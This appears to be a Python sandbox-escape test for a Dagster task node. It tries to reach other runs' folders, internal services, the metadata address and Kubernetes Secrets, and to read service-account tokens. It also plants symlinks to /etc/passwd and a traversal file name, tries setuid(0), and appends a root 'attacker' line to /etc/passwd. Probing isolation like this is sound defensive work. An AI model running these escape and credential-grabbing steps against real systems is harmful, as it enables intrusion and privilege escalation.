"""
A hostile task. It runs as a normal task and tries to get out of the isolation the node gives
it (ADR 0022): another run's folder, the node's services, the Kubernetes API, Secrets and
privileges. Each attempt prints one line:

  BLOCKED  the node stopped it
  LEAKED   it got through
  PLANTED  it left something in its output for delivery to mishandle; the verdict is what the
           delivered results hold, not this line
  ALLOWED  it is meant to work (the task's own database)

It always exits 0, so the run succeeds and its output is delivered like any other task's.
"""

import os
import re
import socket
import ssl
import time
import urllib.error
import urllib.request
from pathlib import Path

ARTIFACT_PATH = Path(os.environ["ARTIFACT_PATH"])
RUN_ID = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$")
SERVICE_ACCOUNT_DIRS = ["/var/run/secrets", "/run/secrets"]
K8S_API = "https://kubernetes.default.svc.cluster.local"
# What an attacker would hope for. The decoy is a Secret named task-decoy with a CANARY value.
SECRET_NAMES = list(dict.fromkeys([os.environ.get("SECRET_NAME", "task-decoy"), "task-decoy", "task-1", "task-2"]))
CANARY = "CANARY-"
# The task's own contract, and what the python image sets: these are its to read.
OWN_ENV = {
    "DB_USERNAME", "DB_PASSWORD", "CONNECTION_STRING", "DAGSTER_PIPES_CONTEXT", "DAGSTER_PIPES_MESSAGES", "GPG_KEY",
}
REPORT: list[str] = []


def record(status: str, name: str, detail: str = ""):
    line = f"{status:8} {name}" + (f" - {detail}" if detail else "")
    print(line, flush=True)
    REPORT.append(line)


def blocked_or_leaked(leak: str, name: str, blocked: str):
    """LEAKED with what it found, or BLOCKED with why nothing was found."""
    record("LEAKED" if leak else "BLOCKED", name, leak or blocked)


# --- storage ---------------------------------------------------------------------------------


def other_run_folders() -> str:
    """Run folders other than mine, visible from any directory above my mount."""
    found = []
    for parent in ARTIFACT_PATH.parents:
        try:
            names = os.listdir(parent)
        except OSError:
            continue
        found += [f"{parent}/{name}" for name in names if RUN_ID.match(name) and parent / name != ARTIFACT_PATH]
    return ", ".join(found[:5])


def try_other_run(run_id: str) -> str:
    """What I could read of, or write into, another run's folder at the places the volume could be."""
    roots = {ARTIFACT_PATH.parent, Path("/mnt/dagster/artifacts"), Path("/artifacts"), Path("/data"), Path("/")}
    got = []
    for root in roots:
        folder = root / run_id
        try:
            names = os.listdir(folder)
        except OSError:
            continue
        got.append(f"listed {folder}: {names[:3]}")
        try:
            (folder / "attacker-was-here").write_text("x")
            got.append(f"wrote into {folder}")
        except OSError:
            pass
    return "; ".join(got)


def attack_storage():
    blocked_or_leaked(other_run_folders(), "list other runs' folders, walking up from my mount",
                      f"no other run folder above {ARTIFACT_PATH}")
    other = os.environ.get("OTHER_RUN_ID")
    if other:
        blocked_or_leaked(try_other_run(other), f"read or write run {other}'s folder by its path",
                          "not found under any root I could reach")
    else:
        record("SKIPPED", "read or write another run's folder by its path", "set OTHER_RUN_ID in DEV_ENV")

    mounts = []
    for line in Path("/proc/self/mountinfo").read_text().splitlines():
        mount_point = line.split()[4]
        if mount_point.startswith(str(ARTIFACT_PATH.parent)) and mount_point != str(ARTIFACT_PATH):
            mounts.append(mount_point)
    blocked_or_leaked(", ".join(mounts), "the artifacts volume mounted anywhere but my own folder",
                      f"only {ARTIFACT_PATH} is mounted from it")

    outside = ARTIFACT_PATH / ".." / "escaped-from-run.txt"
    try:
        outside.write_text("escaped")
    except OSError as error:
        record("BLOCKED", "write ../escaped-from-run.txt, outside my folder", str(error))
    else:
        record("PLANTED", "write ../escaped-from-run.txt, outside my folder",
               f"wrote {os.path.realpath(outside)}; it must not be on the volume")

    plants = {
        "leak-passwd": "/etc/passwd",
        "leak-etc": "/etc",
        "leak-up": "..",
        "leak-volume": str(ARTIFACT_PATH.parent),
    }
    for name, target in plants.items():
        os.symlink(target, ARTIFACT_PATH / name)
        record("PLANTED", f"symlink {name} -> {target}", "delivery must leave it out")
    (ARTIFACT_PATH / "nested").mkdir()
    os.symlink("/etc/hostname", ARTIFACT_PATH / "nested" / "leak-hostname")
    record("PLANTED", "symlink nested/leak-hostname -> /etc/hostname", "delivery must leave it out")
    # One file name that a Windows unzip reads as a path out of its folder.
    (ARTIFACT_PATH / "..\\..\\evil.txt").write_text("evil")
    record("PLANTED", r"file named ..\..\evil.txt", "a Windows unzip would read it as a path")
    (ARTIFACT_PATH / "honest-result.txt").write_text("the one file that should be delivered\n")


# --- network ---------------------------------------------------------------------------------


def connect(host: str, port: int) -> str:
    """'' if the port accepted a connection, else why not."""
    try:
        socket.create_connection((host, port), timeout=4).close()
    except OSError as error:
        return str(error) or type(error).__name__
    return ""


def http_get(url: str) -> tuple[int, str]:
    """Status and the start of the body; 0 when the connection fails."""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(url, timeout=4, context=context) as response:
            return response.status, response.read(200).decode(errors="replace")
    except urllib.error.HTTPError as error:
        return error.code, ""
    except OSError as error:
        return 0, str(error)


def attack_network():
    targets = {
        "the backend API": ("backend.fn.svc.cluster.local", 5000),
        "Gitea": ("gitea.fn.svc.cluster.local", 4000),
        "the Kubernetes API": ("kubernetes.default.svc.cluster.local", 443),
        "nexus-api": ("nexus-api.fn.svc.cluster.local", 5000),
        "Keycloak": ("keycloak.keycloak.svc.cluster.local", 80),
        "the Dagster webserver": ("fn-dev-dagster-webserver.fn.svc.cluster.local", 80),
        "the node's Postgres": ("db.fn.svc.cluster.local", 5432),
        "the cloud metadata address": ("169.254.169.254", 80),
        "the internet": ("1.1.1.1", 443),
    }
    for name, (host, port) in targets.items():
        error = connect(host, port)
        record("LEAKED" if not error else "BLOCKED", f"connect to {name} ({host}:{port})",
               "connected" if not error else error)
    status, body = http_get(f"{K8S_API}/version")
    if status:
        record("LEAKED", "anonymous GET /version on the Kubernetes API", f"HTTP {status} {body[:60]!r}")
    host, port = "db-datasets.experiments.svc.cluster.local", 5432
    error = connect(host, port)
    record("ALLOWED" if not error else "BROKEN", f"connect to the task's own database ({host}:{port})",
           error or "connected")


# --- secrets and privileges --------------------------------------------------------------------


def secrets_on_disk() -> str:
    found = []
    for base in SERVICE_ACCOUNT_DIRS:
        for folder, _, files in os.walk(base):
            found += [os.path.join(folder, name) for name in files]
    return ", ".join(found)


def foreign_env() -> str:
    """Environment variables that look like credentials and are not in the task's contract, or any value holding the canary."""
    suspicious = re.compile(r"KEY|TOKEN|SECRET|PASSWORD", re.I)
    return ", ".join(
        name for name, value in os.environ.items()
        if name not in OWN_ENV and (suspicious.search(name) or CANARY in value)
    )


def attack_secrets():
    blocked_or_leaked(secrets_on_disk(), "read a service account token or any file under /var/run/secrets",
                      "nothing mounted")
    for name in SECRET_NAMES:
        status, body = http_get(f"{K8S_API}/api/v1/namespaces/tasks/secrets/{name}")
        if status == 200:
            record("LEAKED", f"GET secret {name} in the tasks namespace", body[:60])
        else:
            record("BLOCKED", f"GET secret {name} in the tasks namespace", f"HTTP {status}" if status else body)
    status, _ = http_get(f"{K8S_API}/api/v1/namespaces/tasks/secrets")
    record("LEAKED" if status == 200 else "BLOCKED", "list Secrets in the tasks namespace",
           f"HTTP {status}" if status else "no connection")
    blocked_or_leaked(foreign_env(), "credentials in my environment beyond my own dataset's",
                      "only the task contract's variables")


def attack_privileges():
    status = dict(
        line.split(":\t", 1) for line in Path("/proc/self/status").read_text().splitlines() if ":\t" in line
    )
    record("LEAKED" if os.getuid() == 0 else "BLOCKED", "run as root", f"uid={os.getuid()} gid={os.getgid()}")
    record("LEAKED" if int(status["CapEff"], 16) else "BLOCKED", "keep a Linux capability", f"CapEff={status['CapEff']}")
    record("LEAKED" if status["NoNewPrivs"] != "1" else "BLOCKED", "gain privileges (no_new_privs off)",
           f"NoNewPrivs={status['NoNewPrivs']}")
    record("LEAKED" if status["Seccomp"] != "2" else "BLOCKED", "run without a seccomp filter",
           f"Seccomp={status['Seccomp']}")
    try:
        os.setuid(0)
    except OSError as error:
        record("BLOCKED", "setuid(0)", str(error))
    else:
        record("LEAKED", "setuid(0)", "became root")
    try:
        with open("/etc/passwd", "a") as passwd:
            passwd.write("attacker:x:0:0::/:/bin/sh\n")
    except OSError as error:
        record("BLOCKED", "append to /etc/passwd", str(error))
    else:
        record("LEAKED", "append to /etc/passwd", "written")


def attack_limits():
    memory = Path("/sys/fs/cgroup/memory.max").read_text().strip()
    cpu = Path("/sys/fs/cgroup/cpu.max").read_text().strip()
    record("LEAKED" if memory == "max" else "BLOCKED", "use unlimited memory", f"memory.max={memory}")
    record("LEAKED" if cpu.startswith("max") else "BLOCKED", "use unlimited CPU", f"cpu.max={cpu}")


def main():
    if os.environ.get("SLEEP_SECONDS"):  # not an attack: a hung task, to see the pod's deadline end it
        time.sleep(int(os.environ["SLEEP_SECONDS"]))
    for attack in (attack_storage, attack_network, attack_secrets, attack_privileges, attack_limits):
        try:
            attack()
        except Exception as error:  # an attack that crashes is still a result, never a reason to stop
            record("ERROR", attack.__name__, repr(error))
    leaked = sum(line.startswith("LEAKED") for line in REPORT)
    blocked = sum(line.startswith("BLOCKED") for line in REPORT)
    record("SUMMARY", f"leaked={leaked} blocked={blocked}", "GREEN" if not leaked else "RED")
    (ARTIFACT_PATH / "attack-report.txt").write_text("\n".join(REPORT) + "\n")


if __name__ == "__main__":
    main()
